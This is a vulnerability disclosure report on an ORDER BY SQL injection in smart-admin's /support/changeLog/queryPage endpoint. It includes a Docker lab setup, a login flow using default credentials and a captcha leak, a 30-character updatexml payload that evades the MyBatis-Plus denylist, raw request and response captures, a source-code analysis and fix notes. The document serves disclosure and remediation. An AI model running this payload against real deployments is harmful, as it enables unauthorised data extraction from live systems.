### Vulnerability details

**Official website / Product:** https://www.1024lab.net / https://github.com/1024-lab/smart-admin

**Repository:** 1024-lab/smart-admin (stars at selection: 3931)

**Vulnerability type:** SQLi (ORDER BY / error-based)

**Vulnerability versions:** v3.30.0 (commit `59686e8ddf1923caf3e0a25ba75796740e3896d8`; `smart-admin-api-java17-springboot3` + MyBatis-Plus 3.5.12)

**Vulnerability URL / Parameter:** `POST /support/changeLog/queryPage`, JSON parameter `sortItemList[].column`

**Complex:** yes

### Verification procedure

1. Lab topology (original `labs/smart-admin-r54-a1/` was cleaned after verify; image `smart-admin-r54-a1:lab` removed; rebuild with equivalent topology):
   - App: `smart-admin-r54-a1:lab` (`eclipse-temurin:17-jre` + fat jar, listens on **1024** in-container) → host **23401**
   - MySQL: `mysql:8.0`, database `smart_admin_v3`, root password `SmartAdmin666` → host **23411**
   - Redis: `redis:7.2-alpine` → host **23412**
   - Audited tree: `smart-admin-api-java17-springboot3` @ tag/commit above; MyBatis-Plus **3.5.12**
   - Init SQL: repo `数据库SQL脚本/mysql/smart_admin_v3.sql` (includes low-priv employee `huke` and config `super_password=1024ok`)

Reproducible compose skeleton (container names/ports match measured `docker compose ps`):

```yaml
services:
  mysql:
    image: mysql:8.0
    container_name: sa-r54a1-mysql
    ports: ["23411:3306"]
    environment:
      MYSQL_ROOT_PASSWORD: SmartAdmin666
      MYSQL_DATABASE: smart_admin_v3
    volumes:
      - ./smart_admin_v3.sql:/docker-entrypoint-initdb.d/smart_admin_v3.sql
    healthcheck:
      test: ["CMD", "mysqladmin", "ping", "-h", "127.0.0.1", "-uroot", "-pSmartAdmin666"]
      interval: 5s
      timeout: 5s
      retries: 30
  redis:
    image: redis:7.2-alpine
    container_name: sa-r54a1-redis
    ports: ["23412:6379"]
    healthcheck:
      test: ["CMD", "redis-cli", "ping"]
      interval: 5s
      timeout: 3s
      retries: 20
  app:
    image: smart-admin-r54-a1:lab
    container_name: sa-r54a1-app
    ports: ["23401:1024"]
    depends_on:
      mysql:
        condition: service_healthy
      redis:
        condition: service_healthy
```

```dockerfile
# Dockerfile (place the sa-admin executable fat jar as app.jar in the build context)
FROM eclipse-temurin:17-jre
WORKDIR /app
COPY app.jar /app/app.jar
EXPOSE 1024
ENTRYPOINT ["java","-jar","/app/app.jar"]
```

```bash
# 1) Check out and package (dev profile: server.port=1024; point JDBC/Redis at compose service names mysql/redis)
git clone https://github.com/1024-lab/smart-admin.git && cd smart-admin
git checkout 59686e8ddf1923caf3e0a25ba75796740e3896d8
# Copy 数据库SQL脚本/mysql/smart_admin_v3.sql into the lab directory;
# In sa-base dev/test yaml, set datasource URL host to mysql and redis host to redis, then:
cd smart-admin-api-java17-springboot3 && mvn -pl sa-admin -am -DskipTests package
# 2) Build smart-admin-r54-a1:lab with the Dockerfile above, then:
docker compose up -d
# wait until http://127.0.0.1:23401/ returns 200
```

Measured ready state (`docker compose ps`):

```
NAME             IMAGE                    COMMAND                  SERVICE   STATUS                   PORTS
sa-r54a1-app     smart-admin-r54-a1:lab   "java -jar /app/app.…"   app       Up                       0.0.0.0:23401->1024/tcp
sa-r54a1-mysql   mysql:8.0                "docker-entrypoint.s…"   mysql     Up (healthy)             0.0.0.0:23411->3306/tcp
sa-r54a1-redis   redis:7.2-alpine         "docker-entrypoint.s…"   redis     Up (healthy)             0.0.0.0:23412->6379/tcp
```

2. Log in as low-priv employee `huke` (`administrator_flag=0`) and obtain a Sa-Token (**Bearer in the PoC below is the original lab capture; refresh after rebuild**):
   - Super password (config `super_password`): plaintext `1024ok`
   - Frontend SM4 key `1024lab__1024lab`; ciphertext for `1024ok` is `YTdhMzBmM2RiOTE3YmNmZDczNmNiNjJhMzRkN2U1ZWM=`
   - Non-prod `GET /login/getCaptcha` returns both `captchaUuid` and plaintext `captchaText` (4 digits) in `data`; login form fields are `captchaCode` (fill with that plaintext) and `captchaUuid`; `loginDevice=1` (PC)

Get captcha:

```http
GET /login/getCaptcha HTTP/1.1
Host: 127.0.0.1:23401
Accept: application/json
```

Expect: `code=0`, non-empty `data.captchaUuid` / `data.captchaText` (non-prod). Use `captchaText` as `captchaCode` in the next step.

Login (field names per `LoginForm` / `CaptchaForm`; replace `<CAPTCHA_UUID>` / `<CAPTCHA_TEXT>` with values from the previous response):

```http
POST /login HTTP/1.1
Host: 127.0.0.1:23401
Content-Type: application/json
Accept: application/json

{"loginName":"huke","password":"YTdhMzBmM2RiOTE3YmNmZDczNmNiNjJhMzRkN2U1ZWM=","loginDevice":1,"captchaCode":"<CAPTCHA_TEXT>","captchaUuid":"<CAPTCHA_UUID>"}
```

Expect: `code=0`, `data.token` is the Sa-Token; subsequent requests use `Authorization: Bearer <token>`.

3. `POST /support/changeLog/queryPage` with `sortItemList[0].column=updatexml(1,hex(database()),1)` (length exactly 30, passes `@Length(max=30)`). This endpoint has no `@SaCheckPermission`; any authenticated user can hit it.

4. Response `code=10001` with `msg` containing `XPATH syntax error: 'D6172745F61646D696E5F7633'` (truncated leak of `hex(database())` for `smart_admin_v3`); exception SQL shows `ORDER BY updatexml(1,hex(database()),1)`.

5. Control: same path with `column=sleep(1)` is blocked by `SqlInjectionUtils`:

```http
POST /support/changeLog/queryPage HTTP/1.1
Host: 127.0.0.1:23401
Content-Type: application/json
Authorization: Bearer 40c49ae2a6da420e9e10699b1f547f26
Accept: application/json

{"pageNum":1,"pageSize":2,"sortItemList":[{"isAsc":true,"column":"sleep(1)"}]}
```

```json
{"code":10001,"level":"system","msg":"存在SQL注入风险，请联系技术工作人员！","ok":false,"data":null,"dataType":1}
```

### Complete vulnerability PoC

Complete HTTP request (Docker-verified; refresh Bearer per step 2 before replay):

```http
POST /support/changeLog/queryPage HTTP/1.1
Host: 127.0.0.1:23401
Content-Type: application/json
Authorization: Bearer 40c49ae2a6da420e9e10699b1f547f26
Accept: application/json
User-Agent: r54-a1-sqli-verify/1.0
Content-Length: 100

{"pageNum":1,"pageSize":2,"sortItemList":[{"isAsc":true,"column":"updatexml(1,hex(database()),1)"}]}
```

Complete HTTP response (raw Docker-lab response):

```http
HTTP/1.1 200
Vary: Origin
Vary: Access-Control-Request-Method
Vary: Access-Control-Request-Headers
Content-Type: application/json
Transfer-Encoding: chunked
Date: Mon, 02 Nov 2026 11:03:34 GMT

{"code":10001,"level":"system","msg":"org.springframework.jdbc.UncategorizedSQLException: \n### Error querying database.  Cause: java.sql.SQLException: XPATH syntax error: 'D6172745F61646D696E5F7633'\n### The error may exist in URL [jar:nested:/app/app.jar/!BOOT-INF/lib/sa-base-3.0.0.jar!/mapper/support/ChangeLogMapper.xml]\n### The error may involve defaultParameterMap\n### The error occurred while setting parameters\n### SQL: SELECT * FROM t_change_log ORDER BY updatexml(1,hex(database()),1) ASC, t_change_log.update_version DESC LIMIT ?\n### Cause: java.sql.SQLException: XPATH syntax error: 'D6172745F61646D696E5F7633'\n; uncategorized SQLException; SQL state [HY000]; error code [1105]; XPATH syntax error: 'D6172745F61646D696E5F7633'","ok":false,"data":null,"dataType":1}
```

Verification result notes:

HTTP 200 business-error body reflects a MySQL XPATH syntax error; fragment `D6172745F61646D696E5F7633` is the truncated suffix of `hex('smart_admin_v3')`=`736d6172745f61646d696e5f7633`, proving `database()` ran inside ORDER BY. Exception SQL explicitly shows `ORDER BY updatexml(1,hex(database()),1)`. Low-priv user `huke` is sufficient; `sleep(1)` on the same path is denylist-blocked (see step 5).

Impact summary:

```
SQLi confirmed on POST /support/changeLog/queryPage as low-priv user huke.
Payload column=updatexml(1,hex(database()),1) (len=30)
MySQL error in HTTP body: XPATH syntax error: 'D6172745F61646D696E5F7633'
hex(database()) for smart_admin_v3 = 736d6172745f61646d696e5f7633
Error fragment contains admin_v3 suffix of database name.
SQL from exception: SELECT * FROM t_change_log ORDER BY updatexml(1,hex(database()),1) ASC, t_change_log.update_version DESC LIMIT ?
Denylist blocks sleep(1) but not updatexml/hex/database.
```

### Vulnerability analysis

Pagination field `PageParam.SortItem.column` passes `@Length(max=30)` into `SmartPageUtil.convert2PageQuery`, which calls MyBatis-Plus `SqlInjectionUtils.check(column)` and, on pass, builds `OrderItem.asc/desc(column)` into `Page.orders`. The pagination interceptor concatenates those orders into SQL `ORDER BY`, yielding expression injection.

`SqlInjectionUtils` (mybatis-plus-core 3.5.12) denylists `sleep(...)`, `benchmark(...)`, `select(...)`, `concat(...)`, and common DML/comment patterns, but **does not** cover MySQL error-based helpers such as `updatexml` / `extractvalue` / `hex` / `database` / `polygon`. Payload `updatexml(1,hex(database()),1)` is exactly 30 characters, satisfies the length cap, and bypasses the denylist.

`ChangeLogController.queryPage` has no `@SaCheckPermission`, so any authenticated user can hit it; other `SmartPageUtil`-backed page APIs share the same sink (subject to their own permission gates). The product advertises strong SQL-injection defense while relying on an incomplete denylist.

### Trigger / sink source (full path and line numbers)

```java
# File: sa-base/src/main/java/net/lab1024/sa/base/common/util/SmartPageUtil.java
# Lines: 31-58
public static Page<?> convert2PageQuery(PageParam pageParam) {
    Page<?> page = new Page<>(pageParam.getPageNum(), pageParam.getPageSize());
    // ...
    List<PageParam.SortItem> sortItemList = pageParam.getSortItemList();
    if (CollectionUtils.isEmpty(sortItemList)) {
        return page;
    }
    List<OrderItem> orderItemList = new ArrayList<>();
    for (PageParam.SortItem sortItem : sortItemList) {
        if (SmartStringUtil.isEmpty(sortItem.getColumn())) {
            continue;
        }
        if (SqlInjectionUtils.check(sortItem.getColumn())) {
            log.error("《存在SQL注入：》 : {}", sortItem.getColumn());
            throw new BusinessException("存在SQL注入风险，请联系技术工作人员！");
        }
        orderItemList.add(sortItem.getIsAsc() ? OrderItem.asc(sortItem.getColumn()) : OrderItem.desc(sortItem.getColumn()));
    }
    page.setOrders(orderItemList);
    return page;
}
```

```java
# File: sa-base/src/main/java/net/lab1024/sa/base/common/domain/PageParam.java
# Lines: 47-57
public static class SortItem {
    @NotNull(message = "排序规则不能为空")
    private Boolean isAsc;
    @NotBlank(message = "排序字段不能为空")
    @Length(max = 30, message = "排序字段最多30")
    private String column;
}
```

```java
# File: sa-base/src/main/java/net/lab1024/sa/base/module/support/changelog/controller/ChangeLogController.java
# Lines: 31-35
@Operation(summary = "分页查询 @author 卓大")
@PostMapping("/changeLog/queryPage")
public ResponseDTO<PageResult<ChangeLogVO>> queryPage(@RequestBody @Valid ChangeLogQueryForm queryForm) {
    return ResponseDTO.ok(changeLogService.queryPage(queryForm));
}
```

```java
# File: sa-base/src/main/java/net/lab1024/sa/base/module/support/changelog/service/ChangeLogService.java
# Lines: 37-41
public PageResult<ChangeLogVO> queryPage(ChangeLogQueryForm queryForm) {
    Page<?> page = SmartPageUtil.convert2PageQuery(queryForm);
    List<ChangeLogVO> list = changeLogDao.queryPage(page, queryForm);
    return SmartPageUtil.convert2PageResult(page, list);
}
```

MyBatis-Plus `SqlInjectionUtils` (3.5.12) `SQL_SYNTAX_PATTERN` includes `sleep\\s*\\(.*\\)` etc., and does not include `updatexml`/`hex`/`database`.

### Fix notes

1. Enforce a strict allow-list of known column names for sort fields; reject parentheses and function calls.
2. Do not treat MyBatis-Plus `SqlInjectionUtils` denylist as ORDER BY protection.
3. Stop returning full JDBC/SQLException text to API clients in production.
4. Add permission annotations on page APIs that do not need to be open to every authenticated user.
